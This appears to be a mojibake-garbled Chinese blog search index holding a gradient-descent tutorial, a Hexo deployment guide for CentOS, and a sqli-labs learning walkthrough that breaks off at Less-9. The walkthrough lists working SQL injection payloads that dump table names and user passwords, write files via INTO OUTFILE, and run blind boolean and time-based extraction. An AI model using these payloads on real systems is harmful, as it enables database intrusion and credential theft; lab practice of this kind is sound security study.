å…·ä½“åº”ç”¨åˆ°çº¿æ€§å›å½’ç®—æ³•å½“ä¸­ï¼Œç®—æ³•è¡¨ç°ä¸ºï¼šï¼ˆä¹Ÿå°±æ˜¯æŠŠä»£ä»·å‡½æ•°ä»£å…¥ä¸Šå¼ä¸­ï¼‰ åœ¨æ¯ä¸€æ¬¡è¿­ä»£çš„è¿‡ç¨‹ä¸­ï¼Œå¿…é¡»åŒæ—¶æ›´æ–°Î¸0å’ŒÎ¸1çš„å€¼ï¼Œå³ï¼š å†ç¨å¾®è§£é‡Šä¸€ä¸‹è¿™ä¸ªç®—æ³•ï¼š é¦–å…ˆæ˜¯ä¸€ä¸ªå¾ªç¯ç»“æ„ï¼Œå½“ä¸èƒ½å†æ›´æ–°Î¸0, Î¸1æ—¶å¾ªç¯åœæ­¢ï¼Œ:=æ˜¯ä¸€ä¸ªèµ‹å€¼å·ï¼ŒÎ±æ˜¯å­¦ä¹ é€Ÿç‡ï¼Œä¹Ÿå°±æ˜¯ä¸‹å±±æ¯æ¬¡è¿ˆå‡ºå¤šå¤§æ­¥å­ï¼Œåé¢ç´§è·Ÿç€çš„æ˜¯ä¸€ä¸ªåå¯¼æ•°ã€‚ ç”¨å‡ ä½•å›¾å½¢æ¥è§£é‡Šæ˜¾å¾—æ›´ä¸ºç›´è§‚ï¼Œä¸å¦¨è®¾Î¸0=0ï¼š å…¶ä¸­ Î± åé¢çš„å¯¼æ•°å°±ä»£è¡¨ç€è¿™ä¸€ç‚¹çš„æ–œç‡ï¼Œæ¯æ¬¡ Î¸1 æ›´æ–°éƒ½æ˜¯å‡å»ä¸€ä¸ª Î±ä¸è¯¥ç‚¹çš„æ–œç‡ä¹‹ç§¯ï¼Œå½“ä¸‹é™åˆ°å±€éƒ¨æœ€å°å¤„æ—¶ï¼Œå¯¼æ•°æ°å¥½ä¸ºé›¶ï¼Œæ­¤æ—¶ Î¸1 ä¸å†æ›´æ–°ï¼Œå°±å¾—åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯¹äºÎ±çš„å–å€¼è¿˜æ˜¯æ¯”è¾ƒè®²ç©¶çš„ï¼Œå¦‚æœÎ±å¤ªå¤§ï¼Œ ä¼šå‡ºç°ä¸‹å›¾ä¸­çš„æƒ…å†µï¼Œç›´æ¥è·³è¿‡å±€éƒ¨æœ€ä¼˜è§£ï¼Œä¸€ç›´å¾ªç¯ï¼Œè€Œä¸”ç¦»å±€éƒ¨æœ€ä¼˜è§£ä¼šè¶Šæ¥è¶Šè¿œã€‚å¦‚æœÎ±å¤ªå°ï¼Œå¯»æ‰¾å±€éƒ¨æœ€ä¼˜è§£çš„é€Ÿç‡ä¼šç‰¹åˆ«ç‰¹åˆ«æ…¢ã€‚ çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™ç®—æ³• åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å­¦è¿‡äº†çº¿æ€§å›å½’æ¨¡å‹ã€ä»£ä»·å‡½æ•°å’Œæ¢¯åº¦ä¸‹é™ï¼Œè¿™ä¸‰ä¸ªç®—æ³•å°±å¯ä»¥ç»„æˆæˆ‘ä»¬ä»Šå¤©è¦å­¦åˆ°çš„ç¬¬ä¸€ä¸ªæœºå™¨å­¦ä¹ ç®—æ³•ï¼šçº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™ç®—æ³• ï¼ˆGradient Descent For Linear Regressionï¼‰ å·¦è¾¹æ˜¯æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œå³è¾¹æ˜¯çº¿æ€§å›å½’æ¨¡å‹å’Œä»£ä»·å‡½æ•°ã€‚ åˆ†åˆ«æ±‚å‡º j=0 å’Œ j=1 æ—¶ä»£ä»·å‡½æ•°çš„åå¯¼æ•°ï¼š $$ \\frac{\\partial}{\\partial \\theta_0} J(\\theta_0, \\theta_1)=\\dfrac {1}{m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x^{(i)}) - y^{(i)} \\right) $$ å’Œ $$ \\frac{\\partial}{\\partial \\theta_1} J(\\theta_0, \\theta_1)=\\dfrac {1}{m} \\displaystyle \\sum {i=1}^m \\left ((h\\theta (x^{(i)}) - y^{(i)} \\right)x^{(i)} $$ é‚£ä¹ˆï¼ŒæŠŠä¸€èˆ¬æ€§çš„æ¢¯åº¦ä¸‹é™ç®—æ³•åº”ç”¨åˆ°çº¿æ€§å›å½’æ¨¡å‹çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¾—å‡ºä¸€ä¸ªæ–°çš„å…·ä½“å½¢å¼ï¼š $$ \\begin{align*} \\text{repeat until convergence: } \\lbrace &amp; \\newline \\theta_0 := &amp; \\theta_0 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m}(h_\\theta(x_{i}) - y_{i}) \\newline \\theta_1 := &amp; \\theta_1 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m}\\left((h_\\theta(x_{i}) - y_{i}) x_{i}\\right) \\newline \\rbrace&amp; \\end{align*} $$ è¿™ä¸ªç®—æ³•ä¹Ÿå«åšæ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆBatch Gradient Descent ï¼‰ï¼Œä»–çš„ç‰¹ç‚¹å°±æ˜¯æ¯æ¬¡è¿›è¡Œæ¢¯åº¦ä¸‹é™éƒ½è¦ä½¿ç”¨æ•´ä¸ªæ•°æ®é›†ã€‚","tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"çº¿æ€§å›å½’","slug":"çº¿æ€§å›å½’","permalink":"http://ca0y1h.top/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"æœºå™¨å­¦ä¹ /åŸºç¡€å…¥é—¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"é˜¿é‡Œäº‘Centos7+Ngnixéƒ¨ç½²Hexo","date":"2019-10-24T05:08:47.000Z","path":"Other/1.é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo/","text":"é˜¿é‡Œäº‘Centos7+Ngnixéƒ¨ç½²Hexo ä¹‹å‰ä¸€ç›´æŠŠhexoéƒ¨ç½²åœ¨GitHub Pageä¸Šï¼Œç¼ºç‚¹å°±æ˜¯è®¿é—®çš„é€Ÿåº¦æ…¢ï¼Œæœ‰æ—¶å€™ç”šè‡³åŠ è½½ä¸å‡ºæ¥ï¼Œåˆšå¥½ä¹‹å‰ä¹°çš„é˜¿é‡Œäº‘ECSä¹Ÿè½ç°äº†ï¼Œé¡ºæ‰‹æŠŠhexoéƒ¨ç½²åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå†é¡ºæ‰‹è®°å½•ä¸€ä¸‹éƒ¨ç½²è¿‡ç¨‹ã€‚ éƒ¨ç½²ç¯å¢ƒ æœ¬åœ°ç¯å¢ƒï¼š Window10ï¼ˆ64bitï¼‰ Git NodeJS Hexo äº‘ä¸»æœºç¯å¢ƒ Centos7 Nginx å…¶ä»– å®å¡”é¢æ¿ å¼€å§‹éƒ¨ç½² ç”Ÿæˆsshå…¬é’¥ å¦‚æœæœ¬æœºå·²æœ‰id_rsa.pubæ–‡ä»¶ï¼Œæ­¤æ­¥éª¤å¯è·³è¿‡ åœ¨Win10æ¡Œé¢å³å‡»ï¼Œç‚¹å‡»Git Bash Hereæ‰“å¼€å‘½ä»¤è¡Œç»ˆç«¯ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ˆç›´æ¥æŒ‰ä¸‰æ¬¡å›è½¦ç”Ÿæˆå¯†é’¥ï¼‰ 1ssh-keygen -t rsa ç”Ÿæˆçš„æ–‡ä»¶é»˜è®¤åœ¨C:/ç”¨æˆ·/æœ¬æœºç”¨æˆ·å/.ssh/è·¯å¾„ä¸‹ã€‚ Centosæ­å»ºç¯å¢ƒ å®‰è£…Git 1yum -y install git åˆ›å»ºGitè´¦æˆ· 1adduser git æ·»åŠ è´¦æˆ·æƒé™ 12chmod 740 /etc/sudoersvim /etc/sudoers æ‰¾åˆ°ä¸‹é¢è¿™ä¸€è¡Œï¼š 12## Allow root to run any commands anywhereroot ALL=(ALL) ALL ç´§æ¥ç€æ·»åŠ ï¼š 1git ALL(ALL) ALL è®¾ç½®Gitè´¦æˆ·å¯†ç  1sudo passwd git å¤åˆ¶å…¬é’¥ åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º./sshæ–‡ä»¶å¤¹å’Œ``~/.ssh/authorized_keys `æ–‡ä»¶ï¼Œå¹¶ç»™æƒé™ï¼š 123456su gitmkdir ~/.sshvim ~/.ssh/authorized_keys# ç„¶åå°†win10ä¸­ç”Ÿæˆçš„id_rsa.pubæ–‡ä»¶ä¸­çš„å…¬é’¥å¤åˆ¶åˆ°authorized_keyschmod 600 /home/git/.ssh/authorzied_keyschmod 700 /home/git/.ssh åœ¨æœ¬åœ°Gitç»ˆç«¯ä¸­æµ‹è¯•æ˜¯å¦èƒ½å…å¯†ç™»å½•gitï¼Œå…¶ä¸­SERVERä¸ºå¡«å†™è‡ªå·±çš„äº‘ä¸»æœºIPï¼Œæ‰§è¡Œè¾“å…¥yesåä¸ç”¨å¯†ç å°±è¯´æ˜å¥½äº† 1ssh -v git@SERVER åˆ›å»ºæœ¬åœ°ä»“åº“å’Œç½‘ç«™æ ¹ç›®å½• é¦–å…ˆåˆ›å»ºç›®å½•å¹¶ç»™æƒé™ï¼š 12345678#repoä½œä¸ºä¸ºGitä»“åº“ç›®å½•mkdir /var/repochown -R git:git /var/repochmod -R 755 /var/repo#hexoä½œä¸ºç½‘ç«™æ ¹ç›®å½•mkdir /var/www/hexochown -R git:git /var/www/hexochmod -R 755 /var/www/hexo ç„¶ååˆ›å»ºä¸€ä¸ªGitä»“åº“ï¼š 12cd var/repogit init --bare hexoBlog.git è‡ªåŠ¨éƒ¨ç½² åœ¨ /var/repo/hexoBlog.gitä¸‹ï¼Œæœ‰ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„hooksæ–‡ä»¶å¤¹ã€‚æˆ‘ä»¬éœ€è¦åœ¨é‡Œè¾¹æ–°å»ºä¸€ä¸ªæ–°çš„é’©å­æ–‡ä»¶post-receiveã€‚ 1vim /var/repo/hexoBlog.git/hooks/post-receive æ·»åŠ ä¸€ä¸‹å†…å®¹ï¼š 12#!/bin/bashgit --work-tree=/var/www/hexo --git-dir=/var/repo/hexoBlog.git checkout -f ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œä½¿å¾—å…¶å¯æ‰§è¡Œï¼š 12chown -R git:git /var/repo/hexoBlog.git/hooks/post-receivechmod +x /var/repo/hexoBlog.git/hooks/post-receive Centosé…ç½®Nginx ä¸ºäº†é€‚åˆå°ç™½å®‰è£…éƒ¨ç½²å’ŒåæœŸç½‘ç«™æœåŠ¡å™¨çš„æ‰©å±•æ€§ï¼Œé€‰ç”¨å®å¡”é¢æ¿æ¥ä¸€é”®éƒ¨ç½²Nginxã€‚å®å¡”é¢æ¿çš„å®‰è£…å’Œä½¿ç”¨å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ Nginxéƒ¨ç½²æˆåŠŸåå°±å¯ä»¥åˆ›å»ºç½‘ç«™äº†ã€‚ æ²¡æœ‰åŸŸåçš„å¯ä»¥å¡«å†™IPåœ°å€ã€‚ æ³¨æ„ï¼šæ ¹ç›®å½•çš„è·¯å¾„å¿…é¡»æ˜¯ä½ ä¸Šä¸€æ­¥åœ¨äº‘æœåŠ¡å™¨ä¸Šåˆ›å»ºçš„ç½‘ç«™ç›®å½•ã€‚ æœ¬åœ°Hexoé…ç½® é…ç½®_config.yml,å®Œæˆè‡ªåŠ¨åŒ–éƒ¨ç½²ã€‚ æ‰“å¼€blogæ–‡ä»¶å¤¹ï¼Œç¼–è¾‘_config.ymlï¼Œæ‰¾åˆ°deployï¼š 123456deploy: type: git #serveræ”¹ä¸ºä½ çš„æœåŠ¡IPåœ°å€æˆ–è§£æåçš„åŸŸå #ä¾‹å¦‚æˆ‘æ”¹ä¸ºrepo: git@ali6.cn:/var/repo/blog.git repo: git@server:/var/repo/hexoBlog.git branch: master å†æ‰§è¡Œå‘½ä»¤ï¼š 12hexo cleanhexo g -d ä¸å‡ºé”™æ˜¾ç»¿è¯´æ˜å®Œæˆï¼Œæ‰“å¼€æµè§ˆå™¨è¾“å…¥ä½ çš„åŸŸåæˆ–ipåœ°å€å°±å¯ä»¥çœ‹åˆ°ä½ éƒ¨ç½²çš„Hexoåšå®¢äº†ã€‚","tags":[{"name":"hexo","slug":"hexo","permalink":"http://ca0y1h.top/tags/hexo/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge","date":"2019-10-20T07:06:02.000Z","path":"Web_security/basic_learning/9.Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Basic-Challenge SQLæ³¨å…¥ä¸­çš„å¤§åé¼é¼çš„sqli-labsé—¯å…³ï¼Œæ ¹æ®ç½‘ä¸Šç°æœ‰çš„æ•™ç¨‹å†åŠ ä¸Šè‡ªå·±çš„å®è·µï¼Œè®°å½•ä¸€ä¸‹é—¯å…³è¿‡ç¨‹ã€‚è¿™ä¸€ç¯‡æ˜¯Basic-Challengeé˜¶æ®µçš„é¢˜ç›®ã€‚ Less-1 åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ åˆ¤æ–­æ³¨å…¥ç±»å‹ 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; &#x2F;&#x2F;æŠ¥é”™ ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š 1select * from users where id &#x3D; &#39;1&#39;&#39;; é‚£æ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹å‰çš„è¯­å¥é—­åˆäº†å‰é¢çš„'ï¼Œè€Œåé¢å•ä¸€ä¸ª'ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1 &#x2F;&#x2F;æ­£å¸¸ ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š 1select * from users where id &#x3D; &#39;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;; åˆ¤æ–­åˆ—æ•° 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%203%20--+ &#x2F;&#x2F;æ­£å¸¸http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%204%20--+ &#x2F;&#x2F;æŠ¥é”™ å¯ä»¥çœ‹å‡ºæ€»å…±æœ‰ä¸‰åˆ—ï¼Œç»“åˆunionæŸ¥è¯¢ã€‚ çˆ†åº“payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,database()%20--+ æ³¨æ„è¿™é‡Œå¿…é¡»å–ä¸€ä¸ªidä¸å­˜åœ¨çš„æ•°å­—ï¼Œä¾‹å¦‚-1 ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š 1select * from users where id &#x3D; &#39;-1&#39; union select 1,2,database() -- &#39;limit 1,2; çˆ†è¡¨payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20--+ ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š 12select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.table where table_schema&#x3D;database() -- limit 1,2; group_concat()å‡½æ•°æŠŠæ¥è‡ªå¤šè¡Œçš„æ•°æ®è¿æ¥åˆ°ä¸€ä¸ªå­—æ®µå½“ä¸­ã€‚ çˆ†å­—æ®µåpayload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20--+ ç›¸å½“äºæ‰§è¡ŒSQLè¯­å¥ï¼š 12select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(column_name) from information_schema.column where table_name&#x3D;&#39;users&#39; -- limit 1,2; çˆ†å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+ ç›¸å½“äºSQLè¯­å¥ï¼š 12select * from users where id&#x3D; &#39;0&#39; union select 1,2,group_concat(user, 0x3a, password) from users -- &#39;limit 1,2; 0x3aï¼š 0xæ˜¯åå…­è¿›åˆ¶æ ‡å¿—ï¼Œ3aæ˜¯åè¿›åˆ¶çš„58ï¼Œæ˜¯asciiä¸­çš„ â€˜:â€™ ï¼Œç”¨ä»¥åˆ†å‰²paswordå’Œusernameã€‚ Less-2 åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ åˆ¤æ–­æ³¨å…¥ç±»å‹ 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+ æŠ¥é”™ 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+ ä¸æŠ¥é”™ è¯´æ˜è¿™é‡Œæ¥æ”¶çš„idå‚æ•°ç±»å‹ä¸º int å‹ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ ' å»é—­åˆã€‚ å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚ Less-3 åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥ åˆ¤æ–­æ³¨å…¥ç±»å‹ 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27 æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š 12You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 æœ‰ä¸€ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥å°è¯•é—­åˆä¸€ä¸‹æ‹¬å·ï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1)%20and%201&#x3D;1%20--+ æ­£ç¡®æ˜¾ç¤ºä¿¡æ¯ã€‚ å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚ Less-4 åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ åˆ¤æ–­æ³¨å…¥ç±»å‹ å…ˆä½¿ç”¨å•å¼•å·é—­åˆï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27 æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š 12You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 å°è¯•ä½¿ç”¨&quot;&quot;)é—­åˆï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-4&#x2F;?id&#x3D;1%22)%20--+ å…¶ä»–æ­¥éª¤ä¸Less1ç±»ä¼¼ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ã€‚ Less-5 åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ å…³äºåŒæ³¨å…¥çš„å½¢æˆå’Œç†è§£ï¼Œæˆ‘å•ç‹¬å†™äº†å¦å¤–ä¸€ç¯‡åšæ–‡ï¼Œå¯ä»¥ç§»æ­¥è‡³æ­¤ã€‚ çˆ†åº“payloadï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+ æ³¨æ„ï¼Œç”±äºæœ‰éšæœºæ€§ï¼Œå¯èƒ½æˆåŠŸæ‰§è¡Œäº†è¯­å¥æ‰€ä»¥ä¸ä¼šæŠ¥é”™ï¼Œæ­£å¸¸çš„æ˜¾ç¤ºé¡µé¢ï¼ˆå³ä¸æŠ¥é”™ï¼‰ã€‚ çˆ†åˆ—åpayload: 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;??id&#x3D;-1&#39; union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+ çˆ†å­—æ®µpayloadï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+ ä¿®æ”¹limit x,1 å¯ä»¥æ˜¾ç¤ºç¬¬xä¸ªç”¨æˆ·çš„passwordå’Œusernameã€‚ Less-6 åŒæ³¨å…¥GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ åŒå¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸Šä¸€é¢˜çš„å•å¼•å·æ”¹æˆåŒå¼•å·å°±å¯ä»¥äº†ã€‚ Less-7 å¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥ è¯¦ç»†é¢˜è§£ è¿™é“é¢˜æœ€å¼€å§‹ä½¿ç”¨å•å¼•å·é—­åˆå‘ç°ä¼šæœ‰è¯­æ³•é”™è¯¯ï¼Œåªèƒ½ç»è¿‡ä¸æ–­å¤§é‡çš„å°è¯•ï¼Œæœ€åæ‰èƒ½ç¡®å®šä»¥ä¸‹æŸ¥è¯¢è¯­å¥ï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) --+ ç¡®å®šè¯­æ³•æ­£ç¡®åï¼Œå¯ä»¥å¼€å§‹ç¼–å†™payloadï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+ çˆ†åº“payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,database() into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+ çˆ†è¡¨payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() into outfile &quot;&#x2F;tmp&#x2F;hack2.txt&quot; --+ çˆ†å­—æ®µåpayload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; into outfile &quot;&#x2F;tmp&#x2F;hack3.txt&quot; --+ Less-8 å¸ƒå°”å‹å•å¼•å·GETç›²æ³¨ åˆ¤æ–­æ³¨å…¥ç±»å‹ é¦–å…ˆå°è¯•?id=1ï¼Œå‘ç°å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚å†ä½¿ç”¨åµŒå…¥å•å¼•å·?id=1'ï¼Œå‘ç°ä¸èƒ½æ­£å¸¸å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•é”™è¯¯æ¶ˆæ¯ã€‚åªå¥½é€šè¿‡ç›²æ³¨æ¥éªŒè¯ï¼Œè¯¥æ³¨å…¥æŸ¥è¯¢è¿”å›çš„ä¸€å®šæ˜¯Trueæˆ–Falseã€‚ 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+ å¯¹åº”MySQLè¯­å¥æ˜¯ï¼š 12SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;1 ç”±å›æ˜¾çš„ç»“æœå¯çŸ¥è¯¥æŸ¥è¯¢æ˜¯æœ‰æ•ˆçš„ã€‚ æ¥ç€ä¸‹ä¸€æ¡æŸ¥è¯¢ï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;0 --+ å¯¹åº”çš„MySQLè¯­å¥æ˜¯ï¼š 12SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;0 åŒæ ·çš„ï¼Œæ•°æ®åº“ä¼šå¯¹ç»™å®šçš„æƒ…å†µ1=0è¿›è¡Œæ£€æŸ¥ï¼Œæ˜¾ç„¶è¯¥æŸ¥è¯¢æ— æ•ˆçš„ï¼Œå› æ­¤å°†ä¼šè¿”å›FALSEã€‚ ä»¥ä¸Šå³å¯è¯´æ˜è¯¥æ•°æ®åº“æ˜¯å¯è¢«ç›²æ³¨çš„ã€‚ æ•°æ®åº“åçš„é•¿åº¦payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+ æ•°æ®åº“åçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr(database(),1,1)))&#x3D;115 --+ å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜substrå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ è¡¨åçš„é•¿åº¦payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))&#x3D;5 --+ è¡¨åçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1), 1, 1)))&#x3D;117 --+ å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜substrå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ å­—æ®µåçš„é•¿åº¦payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1)))&#x3D;8 --+ å­—æ®µçš„å€¼payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;117 --+ å…¶ä½™ä¾æ¬¡ç±»æ¨ï¼Œåªéœ€è¦æ”¹å˜substrå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ Less-9 åŸºäºæ—¶é—´çš„GETå•å¼•å·ç›²æ³¨ åŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒåŸºäºå¸ƒå°”ç±»å‹çš„ç›²æ³¨åŸç†ä¸Šå·®å¼‚ä¸å¤§ï¼Œåªæ˜¯åœ¨åˆ¤æ–­æ˜¯å¦æ­£ç¡®æ—¶ï¼Œå‰è€…æ˜¯çœ‹æ˜¯å¦æœ‰æ˜æ˜¾çš„å»¶è¿Ÿï¼Œåè€…æ˜¯çœ‹æ˜¯å¦æœ‰å›æ˜¾ã€‚ åˆ¤æ–­æ³¨å…¥ç±»å‹ ä¸ç®¡æ€ä¹ˆè¾“å…¥ï¼Œå›æ˜¾æ€»æ˜¯you are â€¦ï¼Œè€ƒè™‘æ—¶é—´å‹ç›²æ³¨ï¼š 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(3) --+ å‘ç°æ˜æ˜¾å»¶è¿Ÿï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸã€‚ æ•°æ®åº“åçš„é•¿åº¦payload 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+ if(exp1, 